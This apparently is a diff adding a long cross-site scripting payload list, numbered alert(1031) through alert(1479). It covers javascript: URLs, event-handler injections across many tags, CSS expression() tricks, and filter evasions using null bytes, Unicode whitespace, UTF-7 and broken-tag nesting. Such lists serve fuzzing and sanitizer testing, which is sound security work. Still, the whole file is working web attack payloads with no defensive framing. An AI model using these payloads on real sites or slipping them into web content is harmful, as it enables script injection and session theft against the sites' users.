+<STYLE>.XSS{background-image:url("javascript:alert(1031)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1032)")}</STYLE>
+<XSS STYLE="xss:expression(alert(1033))">
+¼script¾alert(1034)¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1035);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1036);">
+<IFRAME SRC="javascript:alert(1037);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(1038)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(1039);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(1040)">
+<TABLE><TD BACKGROUND="javascript:alert(1041)">
+<DIV STYLE="background-image: url(javascript:alert(1042))">
+<DIV STYLE="background-image: url(&#1;javascript:alert(1043))">
+<DIV STYLE="width: expression(alert(1044));">
+<!--[if gte IE 4]><SCRIPT>alert(1045);</SCRIPT><![endif]-->
+<BASE HREF="javascript:alert(1046);//">
+<? echo('<SCR)';echo('IPT>alert(1047)</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert(1048)</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert(1049);+ADw-/SCRIPT+AD4-
+0\"autofocus/onfocus=alert(1050)--><video/poster/ error=prompt(2)>"-confirm(3)-"
+veris-->group<svg/onload=alert(1051)//
+#"><img src=M onerror=alert(1052);>
+element[attribute='<img src=x onerror=alert(1053);>
+[<blockquote cite="]">[" onmouseover="alert(1054);" ]
+<scr<script>ipt>alert(1055)</scr</script>ipt><scr<script>ipt>alert(1055)</scr</script>ipt>
+<sCR<script>iPt>alert(1056)</SCr</script>IPt>
+%253Cscript%253Ealert(1057)%253C%252Fscript%253E
+<IMG SRC=x onload="alert(1058))">
+<IMG SRC=x onafterprint="alert(1059))">
+<IMG SRC=x onbeforeprint="alert(1060))">
+<IMG SRC=x onbeforeunload="alert(1061))">
+<IMG SRC=x onerror="alert(1062))">
+<IMG SRC=x onhashchange="alert(1063))">
+<IMG SRC=x onload="alert(1064))">
+<IMG SRC=x onmessage="alert(1065))">
+<IMG SRC=x ononline="alert(1066))">
+<IMG SRC=x onoffline="alert(1067))">
+<IMG SRC=x onpagehide="alert(1068))">
+<IMG SRC=x onpageshow="alert(1069))">
+<IMG SRC=x onpopstate="alert(1070))">
+<IMG SRC=x onresize="alert(1071))">
+<IMG SRC=x onstorage="alert(1072))">
+<IMG SRC=x onunload="alert(1073))">
+<IMG SRC=x onblur="alert(1074))">
+<IMG SRC=x onchange="alert(1075))">
+<IMG SRC=x oncontextmenu="alert(1076))">
+<IMG SRC=x oninput="alert(1077))">
+<IMG SRC=x oninvalid="alert(1078))">
+<IMG SRC=x onreset="alert(1079))">
+<IMG SRC=x onsearch="alert(1080))">
+<IMG SRC=x onselect="alert(1081))">
+<IMG SRC=x onsubmit="alert(1082))">
+<IMG SRC=x onkeydown="alert(1083))">
+<IMG SRC=x onkeypress="alert(1084))">
+<IMG SRC=x onkeyup="alert(1085))">
+<IMG SRC=x onclick="alert(1086))">
+<IMG SRC=x ondblclick="alert(1087))">
+<IMG SRC=x onmousedown="alert(1088))">
+<IMG SRC=x onmousemove="alert(1089))">
+<IMG SRC=x onmouseout="alert(1090))">
+<IMG SRC=x onmouseover="alert(1091))">
+<IMG SRC=x onmouseup="alert(1092))">
+<IMG SRC=x onmousewheel="alert(1093))">
+<IMG SRC=x onwheel="alert(1094))">
+<IMG SRC=x ondrag="alert(1095))">
+<IMG SRC=x ondragend="alert(1096))">
+<IMG SRC=x ondragenter="alert(1097))">
+<IMG SRC=x ondragleave="alert(1098))">
+<IMG SRC=x ondragover="alert(1099))">
+<IMG SRC=x ondragstart="alert(1100))">
+<IMG SRC=x ondrop="alert(1101))">
+<IMG SRC=x onscroll="alert(1102))">
+<IMG SRC=x oncopy="alert(1103))">
+<IMG SRC=x oncut="alert(1104))">
+<IMG SRC=x onpaste="alert(1105))">
+<IMG SRC=x onabort="alert(1106))">
+<IMG SRC=x oncanplay="alert(1107))">
+<IMG SRC=x oncanplaythrough="alert(1108))">
+<IMG SRC=x oncuechange="alert(1109))">
+<IMG SRC=x ondurationchange="alert(1110))">
+<IMG SRC=x onemptied="alert(1111))">
+<IMG SRC=x onended="alert(1112))">
+<IMG SRC=x onerror="alert(1113))">
+<IMG SRC=x onloadeddata="alert(1114))">
+<IMG SRC=x onloadedmetadata="alert(1115))">
+<IMG SRC=x onloadstart="alert(1116))">
+<IMG SRC=x onpause="alert(1117))">
+<IMG SRC=x onplay="alert(1118))">
+<IMG SRC=x onplaying="alert(1119))">
+<IMG SRC=x onprogress="alert(1120))">
+<IMG SRC=x onratechange="alert(1121))">
+<IMG SRC=x onseeked="alert(1122))">
+<IMG SRC=x onseeking="alert(1123))">
+<IMG SRC=x onstalled="alert(1124))">
+<IMG SRC=x onsuspend="alert(1125))">
+<IMG SRC=x ontimeupdate="alert(1126))">
+<IMG SRC=x onvolumechange="alert(1127))">
+<IMG SRC=x onwaiting="alert(1128))">
+<IMG SRC=x onshow="alert(1129))">
+<IMG SRC=x ontoggle="alert(1130))">
+<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1131)";
+<IMG SRC=x onload="alert(1132))">
+<INPUT TYPE="BUTTON" action="alert(1133)"/>
+"><h1><IFRAME SRC="javascript:alert(1134);"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(1135)"></IFRAME>123</h1>
+<IFRAME SRC="javascript:alert(1136);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(1137)"></IFRAME>
+"><h1><IFRAME SRC=# onmouseover="alert(1138)"></IFRAME>123</h1>
+"></iframe><script>alert(1139);</script><iframe frameborder="0%EF%BB%BF
+"><h1><IFRAME width="420" height="315" SRC="http://www.youtube.com/embed/sxvccpasgTE" frameborder="0" onmouseover="alert(1140)"></IFRAME>123</h1>
+<IFRAME width="420" height="315" frameborder="0" onload="alert(1141)"></IFRAME>
+"><h1><IFRAME SRC="javascript:alert(1142);"></IFRAME>">123</h1>
+"><h1><IFRAME SRC=# onmouseover="alert(1143)"></IFRAME>123</h1>
+<IFRAME SRC="javascript:alert(1144);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(1145)"></IFRAME>
+<img src=``&NewLine; onerror=alert(1146)&NewLine;
+<script /**/>/**/alert(1147)/**/</script /**/
+<iframe/src="data:text/html,<svg &#114811481148;&#114811480;load=alert(1148)>">
+<meta content="&NewLine; 1149 &NewLine;; JAVASCRIPT&colon; alert(1149)" http-equiv="refresh"/>
+<form><iframe &#09;&#11500;&#11501150; src="javascript&#58;alert(1150)"&#11501150;&#11500;&#09;;>
+http://www.google<script .com>alert(1151)</script
+<script ^__^>alert(1152))</script ^__^
+</style &#32;><script &#32; :-(>/**/alert(1153)/**/</script &#32; :-(
+&#00;</form><input type&#61154;"date" onfocus="alert(1154)">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1155)&NewLine;>X</a>
+<script ~~~>alert(1156)</script ~~~>
+<iframe// src=javaSCRIPT&colon;alert(1157)
+<%<!--'%><script>alert(1158);</script -->
+<script src="data:text/javascript,alert(1159)"></script>
+<iframe/onreadystatechange=alert(1160)
+<svg/onload=alert(1161)
+<input type="text" value=`` <div/onmouseover='alert(1162)'>X</div>
+http://www.<script>alert(1163)</script .com
+<svg><script ?>alert(1164)
+<img src=`xx:xx`onerror=alert(1165)>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1166)"/>
+<script>+-+-1167-+-+alert(1167)</script>
+<body/onload=&lt;!--&gt;&#11680alert(1168)>
+<script itworksinallbrowsers>/*<script* */alert(1169)</script
+<img src ?itworksonchrome?\/onerror = alert(1170)
+<svg><script onlypossibleinopera:-)> alert(1171)
+<script x> alert(1172) </script 1172=2
+<div/onmouseover='alert(1173)'> style="x:">
+<--`<img/src=` onerror=alert(1174)> --!>
+<div style="position:absolute;top:0;left:0;width:117500%;height:117500%" onmouseover="prompt(1175)" onclick="alert(1175)">x</button>
+<form><button formaction=javascript&colon;alert(1176)>CLICKME
+<script\x20type="text/javascript">javascript:alert(1177);</script>
+<script\x3Etype="text/javascript">javascript:alert(1178);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1179);</script>
+<script\x09type="text/javascript">javascript:alert(1180);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1181);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1182);</script>
+<script\x0Atype="text/javascript">javascript:alert(1183);</script>
+'`"><\x3Cscript>javascript:alert(1184)</script>
+'`"><\x00script>javascript:alert(1185)</script>
+<img src=1186 href=1186 onerror="javascript:alert(1186)"></img>
+<audio src=1187 href=1187 onerror="javascript:alert(1187)"></audio>
+<video src=1188 href=1188 onerror="javascript:alert(1188)"></video>
+<body src=1189 href=1189 onerror="javascript:alert(1189)"></body>
+<image src=1190 href=1190 onerror="javascript:alert(1190)"></image>
+<object src=1191 href=1191 onerror="javascript:alert(1191)"></object>
+<script src=1192 href=1192 onerror="javascript:alert(1192)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(1193)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1194)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1195)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1196)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(1197)"></body onFocus>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1198)"></frameset onScroll>
+<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1199)"></script onReadyStateChange>
+<html onMouseUp html onMouseUp="javascript:javascript:alert(1200)"></html onMouseUp>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1201)"></body onPropertyChange>
+<svg onLoad svg onLoad="javascript:javascript:alert(1202)"></svg onLoad>
+<body onPageHide body onPageHide="javascript:javascript:alert(1203)"></body onPageHide>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1204)"></body onMouseOver>
+<body onUnload body onUnload="javascript:javascript:alert(1205)"></body onUnload>
+<body onLoad body onLoad="javascript:javascript:alert(1206)"></body onLoad>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1207)"></bgsound onPropertyChange>
+<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1208)"></html onMouseLeave>
+<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1209)"></html onMouseWheel>
+<style onLoad style onLoad="javascript:javascript:alert(1210)"></style onLoad>
+<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1211)"></iframe onReadyStateChange>
+<body onPageShow body onPageShow="javascript:javascript:alert(1212)"></body onPageShow>
+<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1213)"></style onReadyStateChange>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1214)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:alert(1215)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:alert(1216)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:alert(1217)"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1218)"></html onMouseOver>
+<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1219)"></html onMouseEnter>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1220)"></body onBeforeUnload>
+<html onMouseDown html onMouseDown="javascript:javascript:alert(1221)"></html onMouseDown>
+<marquee onScroll marquee onScroll="javascript:javascript:alert(1222)"></marquee onScroll>
+<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1223)"></xml onPropertyChange>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1224)"></frameset onBlur>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1225)"></applet onReadyStateChange>
+<svg onUnload svg onUnload="javascript:javascript:alert(1226)"></svg onUnload>
+<html onMouseOut html onMouseOut="javascript:javascript:alert(1227)"></html onMouseOut>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1228)"></body onMouseMove>
+<body onResize body onResize="javascript:javascript:alert(1229)"></body onResize>
+<object onError object onError="javascript:javascript:alert(1230)"></object onError>
+<body onPopState body onPopState="javascript:javascript:alert(1231)"></body onPopState>
+<html onMouseMove html onMouseMove="javascript:javascript:alert(1232)"></html onMouseMove>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1233)"></applet onreadystatechange>
+<body onpagehide body onpagehide="javascript:javascript:alert(1234)"></body onpagehide>
+<svg onunload svg onunload="javascript:javascript:alert(1235)"></svg onunload>
+<applet onerror applet onerror="javascript:javascript:alert(1236)"></applet onerror>
+<body onkeyup body onkeyup="javascript:javascript:alert(1237)"></body onkeyup>
+<body onunload body onunload="javascript:javascript:alert(1238)"></body onunload>
+<iframe onload iframe onload="javascript:javascript:alert(1239)"></iframe onload>
+<body onload body onload="javascript:javascript:alert(1240)"></body onload>
+<html onmouseover html onmouseover="javascript:javascript:alert(1241)"></html onmouseover>
+<object onbeforeload object onbeforeload="javascript:javascript:alert(1242)"></object onbeforeload>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1243)"></body onbeforeunload>
+<body onfocus body onfocus="javascript:javascript:alert(1244)"></body onfocus>
+<body onkeydown body onkeydown="javascript:javascript:alert(1245)"></body onkeydown>
+<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1246)"></iframe onbeforeload>
+<iframe src iframe src="javascript:javascript:alert(1247)"></iframe src>
+<svg onload svg onload="javascript:javascript:alert(1248)"></svg onload>
+<html onmousemove html onmousemove="javascript:javascript:alert(1249)"></html onmousemove>
+<body onblur body onblur="javascript:javascript:alert(1250)"></body onblur>
+\x3Cscript>javascript:alert(1251)</script>
+'"`><script>/* *\x2Fjavascript:alert(1252)// */</script>
+<script>javascript:alert(1253)</script\x0D
+<script>javascript:alert(1254)</script\x0A
+<script>javascript:alert(1255)</script\x0B
+<script charset="\x22>javascript:alert(1256)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1257)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1258)> -->
+--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1259)> -->
+--><!-- --\x21260> <img src=xxx:x onerror=javascript:alert(1260)> -->
+--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1261)> -->
+`"'><img src='#\x27 onerror=javascript:alert(1262)>
+<a href="javascript\x3Ajavascript:alert(1263)" id="fuzzelement1263">test</a>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1264)//';</script></p>
+<a href="javas\x00cript:javascript:alert(1265)" id="fuzzelement1265">test</a>
+<a href="javas\x07cript:javascript:alert(1266)" id="fuzzelement1266">test</a>
+<a href="javas\x0Dcript:javascript:alert(1267)" id="fuzzelement1267">test</a>
+<a href="javas\x0Acript:javascript:alert(1268)" id="fuzzelement1268">test</a>
+<a href="javas\x08cript:javascript:alert(1269)" id="fuzzelement1269">test</a>
+<a href="javas\x02cript:javascript:alert(1270)" id="fuzzelement1270">test</a>
+<a href="javas\x03cript:javascript:alert(1271)" id="fuzzelement1271">test</a>
+<a href="javas\x04cript:javascript:alert(1272)" id="fuzzelement1272">test</a>
+<a href="javas\x01273cript:javascript:alert(1273)" id="fuzzelement1273">test</a>
+<a href="javas\x05cript:javascript:alert(1274)" id="fuzzelement1274">test</a>
+<a href="javas\x0Bcript:javascript:alert(1275)" id="fuzzelement1275">test</a>
+<a href="javas\x09cript:javascript:alert(1276)" id="fuzzelement1276">test</a>
+<a href="javas\x06cript:javascript:alert(1277)" id="fuzzelement1277">test</a>
+<a href="javas\x0Ccript:javascript:alert(1278)" id="fuzzelement1278">test</a>
+<script>/* *\x2A/javascript:alert(1279)// */</script>
+<script>/* *\x00/javascript:alert(1280)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1281)//></style>
+<style></style\x0D<img src="about:blank" onerror=javascript:alert(1282)//></style>
+<style></style\x09<img src="about:blank" onerror=javascript:alert(1283)//></style>
+<style></style\x20<img src="about:blank" onerror=javascript:alert(1284)//></style>
+<style></style\x0A<img src="about:blank" onerror=javascript:alert(1285)//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1286);/*';">DEF
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1287);/*';">DEF
+<script>if("x\\xE1288\x96\x89".length==2) { javascript:alert(1288);}</script>
+<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1289);}</script>
+<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1290);}</script>
+'`"><\x3Cscript>javascript:alert(1291)</script>
+'`"><\x00script>javascript:alert(1292)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1293)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1294)>
+<script src="data:text/plain\x2Cjavascript:alert(1295)"></script>
+<script src="data:\xD4\x8F,javascript:alert(1296)"></script>
+<script src="data:\xE0\xA4\x98,javascript:alert(1297)"></script>
+<script src="data:\xCB\x8F,javascript:alert(1298)"></script>
+<script\x20type="text/javascript">javascript:alert(1299);</script>
+<script\x3Etype="text/javascript">javascript:alert(1300);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1301);</script>
+<script\x09type="text/javascript">javascript:alert(1302);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1303);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1304);</script>
+<script\x0Atype="text/javascript">javascript:alert(1305);</script>
+ABC<div style="x\x3Aexpression(javascript:alert(1306)">DEF
+ABC<div style="x:expression\x5C(javascript:alert(1307)">DEF
+ABC<div style="x:expression\x00(javascript:alert(1308)">DEF
+ABC<div style="x:exp\x00ression(javascript:alert(1309)">DEF
+ABC<div style="x:exp\x5Cression(javascript:alert(1310)">DEF
+ABC<div style="x:\x0Aexpression(javascript:alert(1311)">DEF
+ABC<div style="x:\x09expression(javascript:alert(1312)">DEF
+ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1313)">DEF
+ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1314)">DEF
+ABC<div style="x:\xC2\xA0expression(javascript:alert(1315)">DEF
+ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1316)">DEF
+ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1317)">DEF
+ABC<div style="x:\x0Dexpression(javascript:alert(1318)">DEF
+ABC<div style="x:\x0Cexpression(javascript:alert(1319)">DEF
+ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1320)">DEF
+ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1321)">DEF
+ABC<div style="x:\x20expression(javascript:alert(1322)">DEF
+ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1323)">DEF
+ABC<div style="x:\x00expression(javascript:alert(1324)">DEF
+ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1325)">DEF
+ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1326)">DEF
+ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1327)">DEF
+ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1328)">DEF
+ABC<div style="x:\x0Bexpression(javascript:alert(1329)">DEF
+ABC<div style="x:\xE2\x80\x81330expression(javascript:alert(1330)">DEF
+ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1331)">DEF
+ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1332)">DEF
+<a href="\x0Bjavascript:javascript:alert(1333)" id="fuzzelement1333">test</a>
+<a href="\x0Fjavascript:javascript:alert(1334)" id="fuzzelement1334">test</a>
+<a href="\xC2\xA0javascript:javascript:alert(1335)" id="fuzzelement1335">test</a>
+<a href="\x05javascript:javascript:alert(1336)" id="fuzzelement1336">test</a>
+<a href="\xE1337\xA0\x8Ejavascript:javascript:alert(1337)" id="fuzzelement1337">test</a>
+<a href="\x13388javascript:javascript:alert(1338)" id="fuzzelement1338">test</a>
+<a href="\x13391339javascript:javascript:alert(1339)" id="fuzzelement1339">test</a>
+<a href="\xE2\x80\x88javascript:javascript:alert(1340)" id="fuzzelement1340">test</a>
+<a href="\xE2\x80\x89javascript:javascript:alert(1341)" id="fuzzelement1341">test</a>
+<a href="\xE2\x80\x80javascript:javascript:alert(1342)" id="fuzzelement1342">test</a>
+<a href="\x13437javascript:javascript:alert(1343)" id="fuzzelement1343">test</a>
+<a href="\x03javascript:javascript:alert(1344)" id="fuzzelement1344">test</a>
+<a href="\x0Ejavascript:javascript:alert(1345)" id="fuzzelement1345">test</a>
+<a href="\x1346Ajavascript:javascript:alert(1346)" id="fuzzelement1346">test</a>
+<a href="\x00javascript:javascript:alert(1347)" id="fuzzelement1347">test</a>
+<a href="\x13480javascript:javascript:alert(1348)" id="fuzzelement1348">test</a>
+<a href="\xE2\x80\x82javascript:javascript:alert(1349)" id="fuzzelement1349">test</a>
+<a href="\x20javascript:javascript:alert(1350)" id="fuzzelement1350">test</a>
+<a href="\x13513javascript:javascript:alert(1351)" id="fuzzelement1351">test</a>
+<a href="\x09javascript:javascript:alert(1352)" id="fuzzelement1352">test</a>
+<a href="\xE2\x80\x8Ajavascript:javascript:alert(1353)" id="fuzzelement1353">test</a>
+<a href="\x13544javascript:javascript:alert(1354)" id="fuzzelement1354">test</a>
+<a href="\x13559javascript:javascript:alert(1355)" id="fuzzelement1355">test</a>
+<a href="\xE2\x80\xAFjavascript:javascript:alert(1356)" id="fuzzelement1356">test</a>
+<a href="\x1357Fjavascript:javascript:alert(1357)" id="fuzzelement1357">test</a>
+<a href="\xE2\x80\x81358javascript:javascript:alert(1358)" id="fuzzelement1358">test</a>
+<a href="\x1359Djavascript:javascript:alert(1359)" id="fuzzelement1359">test</a>
+<a href="\xE2\x80\x87javascript:javascript:alert(1360)" id="fuzzelement1360">test</a>
+<a href="\x07javascript:javascript:alert(1361)" id="fuzzelement1361">test</a>
+<a href="\xE1362\x9A\x80javascript:javascript:alert(1362)" id="fuzzelement1362">test</a>
+<a href="\xE2\x80\x83javascript:javascript:alert(1363)" id="fuzzelement1363">test</a>
+<a href="\x04javascript:javascript:alert(1364)" id="fuzzelement1364">test</a>
+<a href="\x01365javascript:javascript:alert(1365)" id="fuzzelement1365">test</a>
+<a href="\x08javascript:javascript:alert(1366)" id="fuzzelement1366">test</a>
+<a href="\xE2\x80\x84javascript:javascript:alert(1367)" id="fuzzelement1367">test</a>
+<a href="\xE2\x80\x86javascript:javascript:alert(1368)" id="fuzzelement1368">test</a>
+<a href="\xE3\x80\x80javascript:javascript:alert(1369)" id="fuzzelement1369">test</a>
+<a href="\x13702javascript:javascript:alert(1370)" id="fuzzelement1370">test</a>
+<a href="\x0Djavascript:javascript:alert(1371)" id="fuzzelement1371">test</a>
+<a href="\x0Ajavascript:javascript:alert(1372)" id="fuzzelement1372">test</a>
+<a href="\x0Cjavascript:javascript:alert(1373)" id="fuzzelement1373">test</a>
+<a href="\x13745javascript:javascript:alert(1374)" id="fuzzelement1374">test</a>
+<a href="\xE2\x80\xA8javascript:javascript:alert(1375)" id="fuzzelement1375">test</a>
+<a href="\x13766javascript:javascript:alert(1376)" id="fuzzelement1376">test</a>
+<a href="\x02javascript:javascript:alert(1377)" id="fuzzelement1377">test</a>
+<a href="\x1378Bjavascript:javascript:alert(1378)" id="fuzzelement1378">test</a>
+<a href="\x06javascript:javascript:alert(1379)" id="fuzzelement1379">test</a>
+<a href="\xE2\x80\xA9javascript:javascript:alert(1380)" id="fuzzelement1380">test</a>
+<a href="\xE2\x80\x85javascript:javascript:alert(1381)" id="fuzzelement1381">test</a>
+<a href="\x1382Ejavascript:javascript:alert(1382)" id="fuzzelement1382">test</a>
+<a href="\xE2\x81383\x9Fjavascript:javascript:alert(1383)" id="fuzzelement1383">test</a>
+<a href="\x1384Cjavascript:javascript:alert(1384)" id="fuzzelement1384">test</a>
+<a href="javascript\x00:javascript:alert(1385)" id="fuzzelement1385">test</a>
+<a href="javascript\x3A:javascript:alert(1386)" id="fuzzelement1386">test</a>
+<a href="javascript\x09:javascript:alert(1387)" id="fuzzelement1387">test</a>
+<a href="javascript\x0D:javascript:alert(1388)" id="fuzzelement1388">test</a>
+<a href="javascript\x0A:javascript:alert(1389)" id="fuzzelement1389">test</a>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1390)>
+`"'><img src=xxx:x \x22onerror=javascript:alert(1391)>
+`"'><img src=xxx:x \x0Bonerror=javascript:alert(1392)>
+`"'><img src=xxx:x \x0Donerror=javascript:alert(1393)>
+`"'><img src=xxx:x \x2Fonerror=javascript:alert(1394)>
+`"'><img src=xxx:x \x09onerror=javascript:alert(1395)>
+`"'><img src=xxx:x \x0Conerror=javascript:alert(1396)>
+`"'><img src=xxx:x \x00onerror=javascript:alert(1397)>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1398)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1399)>
+"`'><script>\x3Bjavascript:alert(1400)</script>
+"`'><script>\x0Djavascript:alert(1401)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1402)</script>
+"`'><script>\xE2\x80\x81403javascript:alert(1403)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1404)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1405)</script>
+"`'><script>\x09javascript:alert(1406)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1407)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1408)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1409)</script>
+"`'><script>\x00javascript:alert(1410)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1411)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1412)</script>
+"`'><script>\xE1413\x9A\x80javascript:alert(1413)</script>
+"`'><script>\x0Cjavascript:alert(1414)</script>
+"`'><script>\x2Bjavascript:alert(1415)</script>
+"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1416)</script>
+"`'><script>-javascript:alert(1417)</script>
+"`'><script>\x0Ajavascript:alert(1418)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1419)</script>
+"`'><script>\x7Ejavascript:alert(1420)</script>
+"`'><script>\xE2\x80\x87javascript:alert(1421)</script>
+"`'><script>\xE2\x81422\x9Fjavascript:alert(1422)</script>
+"`'><script>\xE2\x80\xA9javascript:alert(1423)</script>
+"`'><script>\xC2\x85javascript:alert(1424)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1425)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1426)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1427)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1428)</script>
+"`'><script>\xE2\x80\x80javascript:alert(1429)</script>
+"`'><script>\x21430javascript:alert(1430)</script>
+"`'><script>\xE2\x80\x82javascript:alert(1431)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1432)</script>
+"`'><script>\xE1433\xA0\x8Ejavascript:alert(1433)</script>
+"`'><script>\x0Bjavascript:alert(1434)</script>
+"`'><script>\x20javascript:alert(1435)</script>
+"`'><script>\xC2\xA0javascript:alert(1436)</script>
+"/><img/onerror=\x0Bjavascript:alert(1437)\x0Bsrc=xxx:x />
+"/><img/onerror=\x22javascript:alert(1438)\x22src=xxx:x />
+"/><img/onerror=\x09javascript:alert(1439)\x09src=xxx:x />
+"/><img/onerror=\x27javascript:alert(1440)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1441)\x0Asrc=xxx:x />
+"/><img/onerror=\x0Cjavascript:alert(1442)\x0Csrc=xxx:x />
+"/><img/onerror=\x0Djavascript:alert(1443)\x0Dsrc=xxx:x />
+"/><img/onerror=\x60javascript:alert(1444)\x60src=xxx:x />
+"/><img/onerror=\x20javascript:alert(1445)\x20src=xxx:x />
+<script\x2F>javascript:alert(1446)</script>
+<script\x20>javascript:alert(1447)</script>
+<script\x0D>javascript:alert(1448)</script>
+<script\x0A>javascript:alert(1449)</script>
+<script\x0C>javascript:alert(1450)</script>
+<script\x00>javascript:alert(1451)</script>
+<script\x09>javascript:alert(1452)</script>
+"><img src=x onerror=javascript:alert(1453)>
+"><img src=x onerror=javascript:alert(1454)>
+"><img src=x onerror=javascript:alert(1455)>
+"><img src=x onerror=javascript:alert(1456)>
+"><img src=x onerror=javascript:alert(1457))>
+"><img src=x onerror=javascript:alert(1458))>
+"><img src=x onerror=javascript:alert(1459))>
+"><img src=x onerror=javascript:alert(1460)>
+"><img src=x onerror=javascript:alert(1461))>
+"><img src=x onerror=javascript:alert(1462))>
+"><img src=x onerror=javascript:alert(1463)>
+"><img src=x onerror=javascript:alert(1464))>
+"><img src=x onerror=javascript:alert(1465)>
+"><img src=x onerror=javascript:alert(1466))>
+"><img src=x onerror=javascript:alert(1467)>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1468)>
+`"'><img src=xxx:x onerror\x00=javascript:alert(1469)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1470)>
+`"'><img src=xxx:x onerror\x0D=javascript:alert(1471)>
+`"'><img src=xxx:x onerror\x20=javascript:alert(1472)>
+`"'><img src=xxx:x onerror\x0A=javascript:alert(1473)>
+`"'><img src=xxx:x onerror\x09=javascript:alert(1474)>
+<script>javascript:alert(1475)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1476)" >
+<input onfocus=javascript:alert(1477) autofocus>
+<input onblur=javascript:alert(1478) autofocus><input autofocus>
+<video poster=javascript:javascript:alert(1479)//
